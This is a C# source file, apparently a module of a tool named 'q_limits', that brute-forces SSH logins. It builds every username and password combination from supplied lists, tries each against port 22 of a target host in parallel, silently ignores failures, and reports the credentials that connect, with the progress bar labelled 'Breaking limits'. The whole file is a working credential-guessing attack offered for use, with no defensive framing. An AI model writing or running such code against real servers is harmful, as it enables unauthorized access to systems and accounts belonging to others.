using Renci.SshNet;
using Spectre.Console;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace q_limits.Modules
{
    public class SSHModule : IModule
    {
        public SSHModule()
        {
            Name = "SSH";
            ID = "ssh";
            Help = "NONONO";
        }
        public override void Load(string dest, int thCount, CredentialContext credContext, Dictionary<string, string> argD, ProgressContext progCtx)
        {
            var buildTask = progCtx.AddTask("[gray][[Module]][/] Building list into mem", true, credContext.Combinations);
            List<Credential> possibilities = new();

            foreach (var username in credContext.Usernames)
            {
                foreach (var password in credContext.Passwords)
                {
                    possibilities.Add(new(username, password));
                    buildTask.Increment(1);
                }
            }

            buildTask.Value = buildTask.MaxValue;
            var mainTask = progCtx.AddTask("[gray][[Module]][/] Breaking limits", true, possibilities.Count);
            ParallelExecutor.ForEachAsync(thCount, possibilities, x => 
            {
                try
                {
                    SshClient cSSH = new(dest, 22, x.Key, x.Value);
                    cSSH.Connect();
                    cSSH.Disconnect();
                    ModuleService.ReportSuccess(dest, x);
                }
                catch (Exception) { /* Don't Care */ }

                lock (mainTask)
                {
                    mainTask.Increment(1);
                }
                return Task.CompletedTask;
            }).GetAwaiter().GetResult();

            mainTask.Value = mainTask.MaxValue;
        }
    }
}
